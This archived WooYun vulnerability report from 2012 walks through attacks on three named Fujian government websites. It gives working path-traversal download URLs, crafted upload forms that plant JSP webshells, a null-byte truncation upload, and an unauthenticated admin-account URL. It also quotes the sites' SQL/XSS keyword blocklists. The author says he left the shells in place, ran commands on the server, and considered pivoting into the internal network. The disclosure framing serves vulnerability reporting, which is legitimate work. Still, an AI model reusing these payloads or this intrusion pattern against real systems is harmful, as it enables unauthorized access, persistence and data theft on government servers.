@@ -1,0 +1,968 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		福建某些局站点任意文件下载  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		福建某些局站点任意文件下载  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/possible">possible</a> 
+</li><li>提交时间：		2012-06-10 10:56</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-06-10：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-06-14：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-06-24：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-07-04：	细节向普通白帽子公开<br/>
+									2012-07-14：	细节向实习白帽子公开<br/>
+									2012-07-25：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">好像政府站点rank挺多的呀....<br />
+好像多写点管理员会给通过还能rank*2...<br />
+这些是真的么？<br />
+我承认我是刷rank的...</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">很是怪异，貌似是一套源码，但是一种方法却不能都成功，应该是每套程序在源程序基础上做了修改，加工的结果。但是有一处却是共有的漏洞，任意文件下载。<br />
+<br />
+<br />
+<br />
+   看到很多站点都存在该漏洞，因此利用这几个站点来说说文件下载漏洞，让程序员认识到这种漏洞危害还是很大的，以后多多注意。<br />
+<br />
+<br />
+<br />
+   任意文件下载漏洞在渗透测试中主要作用：<br />
+<br />
+      1.下载系统本身的配置文件和站点的配置文件，如sam、shadow、web.config、web.xml等<br />
+<br />
+      2. 下载站点本身的源代码找站点其它漏洞，如未授权访问、sql注入、上传、包含等。<br />
+<br />
+<br />
+<br />
+   下面主要以这几个小站来演示一下以任意文件下载漏洞作为切入点的测试过程。<br />
+<br />
+<br />
+<br />
+站点1：福建省文化厅（任意文件下载+任意文件上传限制绕过+任意文件上传）<br />
+<br />
+<br />
+<br />
+   一个下载点：<br />
+<br />
+   http://www.fjwh.gov.cn/download.jsp?path=/UserFiles/File/20111118091214.doc<br />
+<br />
+   简单测试即可发现这个下载点过滤不当，存在漏洞，如<br />
+<br />
+   http://www.fjwh.gov.cn/download.jsp?path=/UserFiles/../download.jsp 即可下载源代码<br />
+<br />
+   看一下download.jsp的实现代码<br />
+<br />
+   &lt;%@page language=&quot;java&quot; contentType=&quot;application/x-msdownload&quot; import=&quot;java.io.*,java.net.*&quot; pageEncoding=&quot;gb2312&quot;%&gt;&lt;% <br />
+<br />
+	String temp=request.getParameter(&quot;path&quot;);<br />
+<br />
+	String[] st = null;<br />
+<br />
+	if(temp != null){<br />
+<br />
+		st = temp.split(&quot;/&quot;);<br />
+<br />
+	}<br />
+<br />
+	if(st != null &amp;&amp; st.length &gt; 0){<br />
+<br />
+				if(!&quot;UserFiles&quot;.equals(st[1])){   //过滤位置，下载路径以UserFiles开头即可绕过下载限制。<br />
+<br />
+					out.println(&quot;文件不存在&quot;);<br />
+<br />
+					return;<br />
+<br />
+				}<br />
+<br />
+	 }<br />
+<br />
+	if(temp==null)<br />
+<br />
+		temp=&quot;&quot;;<br />
+<br />
+	String path=new String(temp.getBytes(&quot;8859_1&quot;),&quot;gb2312&quot;);<br />
+<br />
+	response.reset();<br />
+<br />
+	<br />
+<br />
+	接下来最简单的是下载tomcat-users.xml（如果可以）但是发现http://www.fjwh.gov.cn/manager/html <br />
+<br />
+	不能访问，就不用尝试下载了。<br />
+<br />
+	还是看源代码找文件上传漏洞，比较直接。<br />
+<br />
+	翻了一下找到上传点:<br />
+<br />
+	admin/template/uploadFile.jsp<br />
+<br />
+	admin/content/upload.jsp<br />
+<br />
+	但是发现都不能访问，直接会跳转到主页，下载一下其源代码里面都有<br />
+<br />
+	&lt;%@ include file=&quot;../const.jsp&quot;%&gt;<br />
+<br />
+	const.jsp主要内容如下：<br />
+<br />
+	&lt;%<br />
+<br />
+	String path = request.getContextPath();<br />
+<br />
+	request.setAttribute(&quot;path&quot;,path);<br />
+<br />
+	ManagerDao manager = (ManagerDao) request.getSession().getAttribute(<br />
+<br />
+						Const.SESSION_MANAGER_KEY);<br />
+<br />
+	request.setAttribute(&quot;manager&quot;,manager);<br />
+<br />
+	%&gt;<br />
+<br />
+<br />
+<br />
+	&lt;script&gt;<br />
+<br />
+	if(${manager==null})<br />
+<br />
+		top.location.replace(&quot;&lt;%=path%&gt;/admin/login.jsp&quot;);<br />
+<br />
+	top.window.document.title=&quot;福建省文化厅－－后台管理系统&quot;;<br />
+<br />
+	&lt;/script&gt;<br />
+<br />
+	做的还不错，至少比国土资源厅的好( <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-06519">WooYun: 福建省国土资源厅任意jsp上传</a>  貌似一套源码)不是直接<br />
+<br />
+	可以上传获得shell的。需要登录后台后才可以，尝试是否可以登录后台，可以确定admin/login.jsp 是后台，尝试<br />
+<br />
+	弱口令绕过登录限制。但是发现admin/login.jsp访问之后会直接跳转到主页，下载源代码看一下<br />
+<br />
+	原来里面有&lt;jsp:include page=&quot;limitIP.jsp&quot;&gt;&lt;/jsp:include&gt; limitIP.jsp会读取ip.txt中记录的ip地址，限制<br />
+<br />
+	客户端登录后台。ip限制不知道怎么绕过？但是想admin/content/upload.jsp不能访问，但是其最后响应上传的代码<br />
+<br />
+	在evecom.project.content.struts.action.UploadAction,具体实现代码如下:<br />
+<br />
+	 public ActionForward execute(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response)<br />
+<br />
+  {<br />
+<br />
+    UploadFileForm mission_uploadform = (UploadFileForm)form;<br />
+<br />
+    int limit = 0;<br />
+<br />
+    try {<br />
+<br />
+      limit = Integer.parseInt(request.getParameter(&quot;limit&quot;));<br />
+<br />
+    } catch (Exception e) {<br />
+<br />
+      limit = 0;<br />
+<br />
+    }<br />
+<br />
+    String realPath = request.getParameter(&quot;realPath&quot;);<br />
+<br />
+    String hold = request.getParameter(&quot;hold&quot;);<br />
+<br />
+    String fileName = mission_uploadform.getFname();<br />
+<br />
+    FormFile file = mission_uploadform.getFile();<br />
+<br />
+    if ((file == null) || (file.getFileName().trim().length() == 0)) {<br />
+<br />
+      request.setAttribute(&quot;limit&quot;, Integer.toString(limit));<br />
+<br />
+      request.setAttribute(&quot;returnval&quot;, &quot;上传失败！&quot;);<br />
+<br />
+      return mapping.getInputForward();<br />
+<br />
+    }<br />
+<br />
+    String filename = file.getFileName();<br />
+<br />
+<br />
+<br />
+    double size = file.getFileSize();<br />
+<br />
+    NumberFormat nf = NumberFormat.getInstance();<br />
+<br />
+    nf.setMaximumFractionDigits(4);<br />
+<br />
+    size /= 1048576.0D;<br />
+<br />
+    String filesize = nf.format(size) + &quot;M&quot;;<br />
+<br />
+    SimpleDateFormat df = new SimpleDateFormat(&quot;yyyyMMddhhmmss&quot;);<br />
+<br />
+<br />
+<br />
+    String tempfilename = &quot;&quot;;<br />
+<br />
+    if (hold != null) {<br />
+<br />
+      if (hold.equals(&quot;1&quot;))   //主要参数，是否修改变量名，如果不是1 将会根据当前时间重命名，猜测上传后文件<br />
+<br />
+	                          //名比较麻烦<br />
+<br />
+        tempfilename = filename;<br />
+<br />
+      else if (hold.equals(&quot;2&quot;))<br />
+<br />
+        tempfilename = df.format(new Date()) + &quot;.&quot; + Utils.getFileSuffix(filename);<br />
+<br />
+      else<br />
+<br />
+        tempfilename = Utils.getFilePrefix(filename) + df.format(new Date()) + &quot;.&quot; + Utils.getFileSuffix(filename);<br />
+<br />
+    }<br />
+<br />
+    else {<br />
+<br />
+      tempfilename = df.format(new Date()) + &quot;.&quot; + Utils.getFileSuffix(filename);<br />
+<br />
+    }<br />
+<br />
+    String dir = this.servlet.getServletContext().getRealPath(realPath);<br />
+<br />
+    try {<br />
+<br />
+      InputStream streamin = file.getInputStream();<br />
+<br />
+      OutputStream streamout = new FileOutputStream(dir + &quot;/&quot; + tempfilename);<br />
+<br />
+      int bytesRead = 0;<br />
+<br />
+      byte[] buffer = new byte[8192];<br />
+<br />
+      while ((bytesRead = streamin.read(buffer, 0, 8192)) != -1) {<br />
+<br />
+        streamout.write(buffer, 0, bytesRead);<br />
+<br />
+      }<br />
+<br />
+      streamout.close();<br />
+<br />
+      streamin.close();<br />
+<br />
+      file.destroy();<br />
+<br />
+    } catch (FileNotFoundException e) {<br />
+<br />
+      e.printStackTrace();<br />
+<br />
+    } catch (IOException e1) {<br />
+<br />
+      e1.printStackTrace();<br />
+<br />
+    }<br />
+<br />
+    if (fileName != null) {<br />
+<br />
+      if (fileName.trim().length() == 0)<br />
+<br />
+        fileName = tempfilename;<br />
+<br />
+      else<br />
+<br />
+        fileName = fileName + &quot;/-/&quot; + tempfilename;<br />
+<br />
+    }<br />
+<br />
+    System_LogService sls = System_LogServiceImpl.getSli();<br />
+<br />
+    System_LogForm slf = new System_LogForm();<br />
+<br />
+    slf.setLogremark(&quot;上传了文件名为:&quot; + filename + &quot;的文件&quot;);<br />
+<br />
+    slf.setLogip(request.getRemoteAddr());<br />
+<br />
+    ManagerDao manager = (ManagerDao)request.getSession().getAttribute(Const.SESSION_MANAGER_KEY);<br />
+<br />
+    slf.setLoguser(manager.getAccount());<br />
+<br />
+    slf.setLogdate(Utils.getNowDate(&quot;yyyy-MM-dd HH:mm:ss&quot;));<br />
+<br />
+    slf.setIsSucc(&quot;成功&quot;);<br />
+<br />
+    sls.addSystemLog(slf);<br />
+<br />
+    request.setAttribute(&quot;realPath&quot;, realPath);<br />
+<br />
+    request.setAttribute(&quot;fileName&quot;, fileName);<br />
+<br />
+    request.setAttribute(&quot;limit&quot;, Integer.toString(limit));<br />
+<br />
+    request.setAttribute(&quot;returnval&quot;, &quot;上传文件&quot; + filename + &quot;成功,大小为&quot; + filesize);<br />
+<br />
+    return mapping.getInputForward();<br />
+<br />
+  }<br />
+<br />
+	整个处理上传过程，没有验证了，是否可以使用本地上传绕过程序本身对客户端ip的限制？只有试了才知道<br />
+<br />
+	构造本地上传页面如下(就是将admin/content/upload.jsp内容的相对路径修改成绝对路径，你懂的，将hold参数设置1:<br />
+<br />
+	&lt;form action=&quot;http://www.fjwh.gov.cn/upload.do?realPath=/UserFiles/Image/&amp;limit=0&amp;hold=1&quot; name=&quot;uploadForm&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;<br />
+<br />
+  	&lt;INPUT type=&quot;hidden&quot; name=&quot;fname&quot; value=&quot;shell1.jsp&quot;&gt;<br />
+<br />
+  &lt;p&gt;&lt;br&gt;<br />
+<br />
+  &lt;/p&gt;<br />
+<br />
+  &lt;table width=&quot;100%&quot; border=&quot;0&quot; cellPadding=&quot;0&quot; cellSpacing=&quot;1&quot; borderColor=&quot;#6699cc&quot; bgcolor=&quot;9dbdd1&quot; style=&quot;border-collapse: collapse&quot;&gt;<br />
+<br />
+    &lt;tr align=&quot;center&quot; bgcolor=&quot;#EEF4F7&quot;  class=&quot;bg&quot;&gt; <br />
+<br />
+      &lt;td height=&quot;26&quot; colspan=&quot;6&quot; bgcolor=&quot;#EEF4F7&quot;&gt;&lt;div align=&quot;left&quot;&gt;&lt;span class=&quot;tx&quot;&gt;&amp;nbsp;&lt;img src=&quot;../images/introa.gif&quot; width=&quot;14&quot; height=&quot;12&quot;&gt;上传文件&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;<br />
+<br />
+    &lt;/tr&gt;<br />
+<br />
+  &lt;/table&gt;<br />
+<br />
+  &lt;table width=&quot;100%&quot; id=&quot;tbList&quot; border=&quot;0&quot; cellPadding=&quot;0&quot; cellSpacing=&quot;1&quot; borderColor=&quot;#6699cc&quot; bgcolor=&quot;9dbdd1&quot; style=&quot;border-collapse: collapse&quot;&gt;<br />
+<br />
+    &lt;tr align=&quot;center&quot; bgcolor=&quot;#EEF4F7&quot;&gt; <br />
+<br />
+      &lt;td height=&quot;26&quot;&gt;&lt;font color=&quot;#000000&quot;&gt;请选择上传的文件&lt;/font&gt; :&lt;/td&gt;<br />
+<br />
+      &lt;td&gt;&lt;input class=&quot;button&quot; type=&quot;file&quot; name=&quot;file&quot; class=&quot;box&quot; /&gt;       &lt;input name=&quot;submit&quot; type=&quot;submit&quot; class=&quot;button&quot; onclick=&quot;onSet();&quot; value=&quot;上传&quot; /&gt;&lt;/td&gt;<br />
+<br />
+    &lt;/tr&gt;<br />
+<br />
+  &lt;/table&gt;<br />
+<br />
+&lt;/form&gt;<br />
+<br />
+<br />
+<br />
+   选择一个文件上传，返回500错误，难道我猜错了？在看一下源代码哪里产生异常了，虽然不太写jsp，但是看还不是<br />
+<br />
+   问题：<br />
+<br />
+      try {<br />
+<br />
+      InputStream streamin = file.getInputStream();<br />
+<br />
+      OutputStream streamout = new FileOutputStream(dir + &quot;/&quot; + tempfilename);<br />
+<br />
+      int bytesRead = 0;<br />
+<br />
+      byte[] buffer = new byte[8192];<br />
+<br />
+      while ((bytesRead = streamin.read(buffer, 0, 8192)) != -1) {<br />
+<br />
+        streamout.write(buffer, 0, bytesRead);<br />
+<br />
+      }<br />
+<br />
+      streamout.close();<br />
+<br />
+      streamin.close();<br />
+<br />
+      file.destroy();<br />
+<br />
+	  至少在这段代码之前不会产生异常，那说明保存文件没有错误，已经成功了。应该是如下<br />
+<br />
+	   ManagerDao manager = (ManagerDao)request.getSession().getAttribute(Const.SESSION_MANAGER_KEY);<br />
+<br />
+    slf.setLoguser(manager.getAccount());<br />
+<br />
+    slf.setLogdate(Utils.getNowDate(&quot;yyyy-MM-dd HH:mm:ss&quot;));<br />
+<br />
+    slf.setIsSucc(&quot;成功&quot;);<br />
+<br />
+	获得session的位置导致的问题，读取验证身份的session由于本地上传，提交自然是空，获得对象导致异常，返回<br />
+<br />
+	500错误。<br />
+<br />
+	但是这个错误不影响上传，因此已经保存文件成功了（有点绕，就是保存成功后异常），根据代码可以知道<br />
+<br />
+	上传成功后，保存文件路径是http://www.fjwh.gov.cn/UserFiles/Image/shell.jsp（我选择上传的文件名是<br />
+<br />
+	shell.jsp） 直接访问shell证明猜测正确。shell就不删除了，证明来过。<br />
+<br />
+	<br />
+<br />
+	其实总体来说这套代码做的已经挺好，但由于任意文件下载导致源码泄露，白盒审计会导致很多问题被暴露。对渗透<br />
+<br />
+	来说事半功倍。<br />
+<br />
+	<br />
+<br />
+	其实看到源代码该站点还是有很多问题。<br />
+<br />
+	最危险的可能是这个fck 但是修改了路径/FCKeditor/editor/fi1smengors/browser/default/connectors/jsp/connector<br />
+<br />
+	admin/content/upload.jsp 中还有一个删除文件功能http://www.fjwh.gov.cn/delMoreFile.do?realPath=/UserFiles/Image/&amp;filename=shell.jsp&amp;notSelect=1<br />
+<br />
+	源码审计可能还会发现问题，不去一一查找了，只是文件上传和删除就足以说明危害了....<br />
+<br />
+	<br />
+<br />
+	本来想看看有啥在线办公的，但是根据没啥意思，这些不应该是俺做的，留着厂商自己看吧，（把你的ip添加到ip.txt<br />
+<br />
+	就可以访问后台了，然后用shell添加一个session就可以访问后台了）<br />
+<br />
+	<br />
+<br />
+站点2：福建省农产品信息网（任意文件下载+未授权访问+上传）<br />
+<br />
+    下载点<br />
+<br />
+     218.66.59.31/fjgxs/templates/download.jsp?path=/UserFiles/../templates/download.jsp	<br />
+<br />
+	与上一个一样代码过滤不当导致任意文件下载<br />
+<br />
+	if(st != null &amp;&amp; st.length &gt; 0){<br />
+<br />
+        	if(!&quot;UserFiles&quot;.equals(st[0])){<br />
+<br />
+        		out.println(&quot;文件不存在&quot;);<br />
+<br />
+          		return;<br />
+<br />
+        	}<br />
+<br />
+        }<br />
+<br />
+<br />
+<br />
+	 通过文件下载点，简单翻一翻，发现后台功能页面未授权访问<br />
+<br />
+	 http://218.66.59.31/admin/admin.jsp<br />
+<br />
+	 http://218.66.59.31/accountForward.do?submitType=add 直接添加管理员账号<br />
+<br />
+	 <br />
+<br />
+	 这套代码与国土资源厅的很相似，国土资源厅也存在未授权访问<br />
+<br />
+	 http://mail.fjgtzy.gov.cn/admin/admin.jsp<br />
+<br />
+	 虽然不能添加账户，但却是网上审批 最重要的功能存在问题。<br />
+<br />
+	 <br />
+<br />
+	 后台上传无限制直接的shell<br />
+<br />
+	 http://218.66.59.31/html/6/3/47864_201268428_1.html<br />
+<br />
+	 添加的图片和附件都可以传。<br />
+<br />
+	 <br />
+<br />
+	 也有任意文件删除漏洞，就不说了。<br />
+<br />
+	 <br />
+<br />
+站点3：福建省知识产权局（任意文件下载+截断上传）<br />
+<br />
+     http://www.fjipo.gov.cn/templates/download.jsp?path=/UserFiles/File/20120529015133.zip<br />
+<br />
+	 上传漏洞同上<br />
+<br />
+	 http://www.fjipo.gov.cn/templates/download.jsp?path=/UserFiles/../WEB-INF/web.xml<br />
+<br />
+	 <br />
+<br />
+	 喜出望外呀，FCK路径，直接访问<br />
+<br />
+	 http://www.fjipo.gov.cn/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&amp;Type=Image&amp;CurrentFolder=/<br />
+<br />
+	 提示访问非法“该页面不存在或者包含非法字符!”怎么回事？应该是拦截了，没有通过过滤验证什么的，看一下web.xml配置<br />
+<br />
+	 原来使用了jsp的过滤器：配置如下<br />
+<br />
+	 &lt;!-- 域名登录口 --&gt;<br />
+<br />
+	 &lt;filter&gt;<br />
+<br />
+		&lt;filter-name&gt;CheckAdminURLFilter&lt;/filter-name&gt;<br />
+<br />
+		&lt;filter-class&gt;com.tool.filter.CheckAdminURLFilter&lt;/filter-class&gt;<br />
+<br />
+	&lt;/filter&gt;<br />
+<br />
+	&lt;filter-mapping&gt;<br />
+<br />
+		&lt;filter-name&gt;CheckAdminURLFilter&lt;/filter-name&gt;<br />
+<br />
+		&lt;url-pattern&gt;/*&lt;/url-pattern&gt;<br />
+<br />
+	&lt;/filter-mapping&gt;<br />
+<br />
+	&lt;!-- 流量统计 --&gt;<br />
+<br />
+	&lt;filter&gt;<br />
+<br />
+		&lt;filter-name&gt;VisitFilter&lt;/filter-name&gt;<br />
+<br />
+		&lt;filter-class&gt;com.visitcount.filter.VisitFilter&lt;/filter-class&gt;<br />
+<br />
+	&lt;/filter&gt;<br />
+<br />
+	&lt;filter-mapping&gt;<br />
+<br />
+		&lt;filter-name&gt;VisitFilter&lt;/filter-name&gt;<br />
+<br />
+		&lt;url-pattern&gt;/*&lt;/url-pattern&gt;<br />
+<br />
+	&lt;/filter-mapping&gt;<br />
+<br />
+	&lt;!--<br />
+<br />
+		防注入：原来的，部分不起做作用 &lt;filter&gt; &lt;filter-name&gt;CheckVisitFilter&lt;/filter-name&gt;<br />
+<br />
+		&lt;filter-class&gt;com.tool.filter.CheckVisitFilter&lt;/filter-class&gt;<br />
+<br />
+		&lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;CheckVisitFilter&lt;/filter-name&gt;<br />
+<br />
+		&lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt;<br />
+<br />
+	--&gt;<br />
+<br />
+	&lt;!-- 新的sql脚本注入和XSS跨站攻击过滤器--&gt;<br />
+<br />
+	&lt;filter&gt;<br />
+<br />
+		&lt;filter-name&gt;sqlAndXssFilter&lt;/filter-name&gt;<br />
+<br />
+		&lt;filter-class&gt;com.tool.filter.SqlAndXssFilter&lt;/filter-class&gt;<br />
+<br />
+	&lt;/filter&gt;<br />
+<br />
+	&lt;filter-mapping&gt;<br />
+<br />
+		&lt;filter-name&gt;sqlAndXssFilter&lt;/filter-name&gt;<br />
+<br />
+		&lt;url-pattern&gt;/*&lt;/url-pattern&gt;<br />
+<br />
+	&lt;/filter-mapping&gt;<br />
+<br />
+	&lt;filter&gt;<br />
+<br />
+		&lt;filter-name&gt;SetCharsetEncoding&lt;/filter-name&gt;<br />
+<br />
+		&lt;filter-class&gt;com.tool.filter.CharsetFilter&lt;/filter-class&gt;<br />
+<br />
+		&lt;init-param&gt;<br />
+<br />
+			&lt;param-name&gt;encoding&lt;/param-name&gt;<br />
+<br />
+			&lt;param-value&gt;GBK&lt;/param-value&gt;<br />
+<br />
+		&lt;/init-param&gt;<br />
+<br />
+	&lt;/filter&gt;<br />
+<br />
+	&lt;filter-mapping&gt;<br />
+<br />
+		&lt;filter-name&gt;SetCharsetEncoding&lt;/filter-name&gt;<br />
+<br />
+		&lt;url-pattern&gt;/*&lt;/url-pattern&gt;<br />
+<br />
+	&lt;/filter-mapping&gt;<br />
+<br />
+	过滤器不是很明白，但是猜也能知道是干什么的，对于每个请求先经过每个过滤器，好像是doFilter <br />
+<br />
+	CheckAdminURLFilter过滤器主要是读取filterAdminUrl.properties中内容www,admin<br />
+<br />
+	请求的url中必须含有改内容之一，否则请求失败，但是这个过滤器本身对于安全作用不大<br />
+<br />
+	<br />
+<br />
+	sqlAndXssFilter是防止sql注入与xss的，首先读取filtercode.properties内容<br />
+<br />
+	evecom.formcode=&lt;img ,&lt;image ,&lt;a ,&lt;iframe ,&lt;script ,select &amp;from ,insert &amp;values&amp;(,update &amp;set &amp;\=,delete ,&lt;br ,&lt;hr ,&lt;font ,&lt;div ,&lt;span ,&lt;p&gt;<br />
+<br />
+    evecom.sqlcode=&#039;,and,exec,delete,insert,select,delete,update,count,*,%,chr,mid,master,truncate,char,declare,--,+,xp_cmdshell,net,&lt;iframe&gt;,&lt;/frame&gt;,&lt;script&gt;,&lt;/script&gt;,&lt;,&gt;,alert,expression<br />
+<br />
+    evecom.xsscode=&lt;iframe&gt;,&lt;/iframe&gt;,&lt;script&gt;,&lt;/script&gt;,expression,alert,delete,and,insert,select,truncate,main,street,--,+,foobar,javascript<br />
+<br />
+    具体代码：<br />
+<br />
+	private String path = &quot;/filtercode.properties&quot;;<br />
+<br />
+    private String docDo = &quot;contentAdd.do,contentEdit.do,mailboxContentEdit.do,contentRecycle.do&quot;;<br />
+<br />
+	<br />
+<br />
+	public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterchain)<br />
+<br />
+    throws IOException, ServletException<br />
+<br />
+  {<br />
+<br />
+    HttpServletRequest req = (HttpServletRequest)request;<br />
+<br />
+    HttpServletResponse res = (HttpServletResponse)response;<br />
+<br />
+<br />
+<br />
+    String[] closeFlag = this.docDo.split(&quot;,&quot;);<br />
+<br />
+    String url = req.getRequestURI();<br />
+<br />
+<br />
+<br />
+    for (String closef : closeFlag) {<br />
+<br />
+      if (url.indexOf(closef) != -1) { //内置的几个页面不做检查<br />
+<br />
+        System.out.println(&quot;不校验contentAdd.do,contentEdit.do,mailboxContentEdit.do的sql注入&quot;);<br />
+<br />
+        filterchain.doFilter(request, response);<br />
+<br />
+        return;<br />
+<br />
+      }<br />
+<br />
+<br />
+<br />
+    }<br />
+<br />
+<br />
+<br />
+    res.setCharacterEncoding(&quot;GBK&quot;);<br />
+<br />
+    request.setCharacterEncoding(&quot;GBK&quot;);<br />
+<br />
+    //检查是否存在注入代码：<br />
+<br />
+    if ((req instanceof HttpServletRequest)) {<br />
+<br />
+      Enumeration e = req.getParameterNames();<br />
+<br />
+      while (e.hasMoreElements()) {<br />
+<br />
+        String parName = (String)e.nextElement();<br />
+<br />
+        String parNameValue = req.getParameter(parName);<br />
+<br />
+<br />
+<br />
+        if ((parNameValue == null) || (parNameValue.equals(&quot;&quot;)) || <br />
+<br />
+          (!validSqlStr(parNameValue))) //检查是否含有sql注入关键字<br />
+<br />
+          continue;<br />
+<br />
+        res.getWriter().write(&quot;该页面不存在或者包含非法字符!&lt;a href=&quot; + url + &quot;&gt;返回&lt;/a&gt;&quot;);<br />
+<br />
+<br />
+<br />
+        return;<br />
+<br />
+      }<br />
+<br />
+<br />
+<br />
+    }<br />
+<br />
+<br />
+<br />
+    String query_str = req.getQueryString();<br />
+<br />
+    if ((query_str != null) &amp;&amp; (!query_str.equals(&quot;&quot;)) &amp;&amp; <br />
+<br />
+      (viladXssStr(query_str))) //检查是否含有xss关键字<br />
+<br />
+    {<br />
+<br />
+      res.getWriter().write(&quot;该页面不存在或者包含非法字符!&lt;a href=&quot; + url + &quot;&gt;返回&lt;/a&gt;&quot;);<br />
+<br />
+      return;<br />
+<br />
+    }<br />
+<br />
+<br />
+<br />
+    filterchain.doFilter(request, response);<br />
+<br />
+  }<br />
+<br />
+    但由于检查xss注入中会检查 and，而<br />
+<br />
+    http://www.fjipo.gov.cn/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&amp;Type=Image&amp;CurrentFolder=/<br />
+<br />
+    请求中Command中包含and导致无法访问。真是悲剧。这个command是fck的必须参数，本想使用post传递参数，但是...<br />
+<br />
+	想到fck还有一个上传路径，如果设置不当会导致黑名单绕过（ <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-07387">WooYun: 中国联通某省站点任意文件上传</a> ）<br />
+<br />
+	尝试一下发现上传后文件被重命名了，原来这个上传页面被改写了不是fck默认页面，相应页面<br />
+<br />
+	com.lion.cms.frontend.servlet.SimpleUploaderServlet<br />
+<br />
+	看一下源代码使用时间+上传文件后缀的方法保存上传文件<br />
+<br />
+	   String namebydate = String.valueOf(Calendar.getInstance().getTime().getTime()) + random + &quot;.&quot; + ext;<br />
+<br />
+        File pathToSave = new File(currentDirPath, namebydate);<br />
+<br />
+		这个没弄明白咋绕过，加点 加空格 都没有绕过去 （jspx不能解析），这个黑名单还真没搞定。还求明白大神指点一二<br />
+<br />
+ <br />
+<br />
+    没有办法还是看代码找程序本身的上传点，与国土资源厅好像是一套代码（ <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-06519">WooYun: 福建省国土资源厅任意jsp上传</a> ）<br />
+<br />
+	想到上传点admin/template/uploadFile.jsp 但是跳回首页了 使用下载点下载该页面<br />
+<br />
+	http://www.fjipo.gov.cn/templates/download.jsp?path=/UserFiles/../admin/template/uploadFile.jsp<br />
+<br />
+	证明确实存在，对应的上传处理代码直接参考（ <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-06519">WooYun: 福建省国土资源厅任意jsp上传</a> ）应该是一样的<br />
+<br />
+	，在此省略了太占篇幅了...<br />
+<br />
+	使用站点1方法直接本地上传,还是有上面的上传代码，仅修改路径<br />
+<br />
+	&lt;form action=&quot;http://www.fjipo.gov.cn/uploadFile.do?realPath=/UserFiles/&amp;limit=0&amp;hold=1&quot; name=&quot;uploadForm&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;<br />
+<br />
+  	&lt;INPUT type=&quot;hidden&quot; name=&quot;fname&quot; value=&quot;shell1.jsp&quot;&gt;<br />
+<br />
+  &lt;p&gt;&lt;br&gt;<br />
+<br />
+  &lt;/p&gt;<br />
+<br />
+  &lt;table width=&quot;100%&quot; border=&quot;0&quot; cellPadding=&quot;0&quot; cellSpacing=&quot;1&quot; borderColor=&quot;#6699cc&quot; bgcolor=&quot;9dbdd1&quot; style=&quot;border-collapse: collapse&quot;&gt;<br />
+<br />
+    &lt;tr align=&quot;center&quot; bgcolor=&quot;#EEF4F7&quot;  class=&quot;bg&quot;&gt; <br />
+<br />
+      &lt;td height=&quot;26&quot; colspan=&quot;6&quot; bgcolor=&quot;#EEF4F7&quot;&gt;&lt;div align=&quot;left&quot;&gt;&lt;span class=&quot;tx&quot;&gt;&amp;nbsp;&lt;img src=&quot;../images/introa.gif&quot; width=&quot;14&quot; height=&quot;12&quot;&gt;上传文件&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;<br />
+<br />
+    &lt;/tr&gt;<br />
+<br />
+  &lt;/table&gt;<br />
+<br />
+  &lt;table width=&quot;100%&quot; id=&quot;tbList&quot; border=&quot;0&quot; cellPadding=&quot;0&quot; cellSpacing=&quot;1&quot; borderColor=&quot;#6699cc&quot; bgcolor=&quot;9dbdd1&quot; style=&quot;border-collapse: collapse&quot;&gt;<br />
+<br />
+    &lt;tr align=&quot;center&quot; bgcolor=&quot;#EEF4F7&quot;&gt; <br />
+<br />
+      &lt;td height=&quot;26&quot;&gt;&lt;font color=&quot;#000000&quot;&gt;请选择上传的文件&lt;/font&gt; :&lt;/td&gt;<br />
+<br />
+      &lt;td&gt;&lt;input class=&quot;button&quot; type=&quot;file&quot; name=&quot;file&quot; class=&quot;box&quot; /&gt;       &lt;input name=&quot;submit&quot; type=&quot;submit&quot; class=&quot;button&quot; onclick=&quot;onSet();&quot; value=&quot;上传&quot; /&gt;&lt;/td&gt;<br />
+<br />
+    &lt;/tr&gt;<br />
+<br />
+  &lt;/table&gt;<br />
+<br />
+  &lt;/form&gt;<br />
+<br />
+  发现上传应该没有问题，但是上传后重命名了，应该修改程序去猜这个上传后路径，但是有些麻烦比较懒，在看代码<br />
+<br />
+	String realPath = request.getParameter(&quot;realPath&quot;);<br />
+<br />
+    String dir = this.servlet.getServletContext().getRealPath(realPath);<br />
+<br />
+	OutputStream streamOut = new FileOutputStream(dir + &quot;/&quot; + tempfilename);<br />
+<br />
+	上传后文件保存路径是由客户端控制的，那么如果请求<br />
+<br />
+	http://www.fjipo.gov.cn/uploadFile.do?realPath=/UserFiles/test.jsp%00会怎样？当然希望是00截断了<br />
+<br />
+	如我所愿成功了。<br />
+<br />
+	http://www.fjipo.gov.cn/UserFiles/test.jsp（留下shell证明来过）<br />
+<br />
+	<br />
+<br />
+	 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">接上<br />
+<br />
+看到shell习惯性的netstat -an一下 居然看到了53好久没有看到过53了，真的想上去看看不会是域名服务器吧<br />
+<br />
+	我承认我邪恶了，但是没有恶意只是想看看<br />
+<br />
+	内网ip端口转发吧（http://zone.wooyun.org/content/325）<br />
+<br />
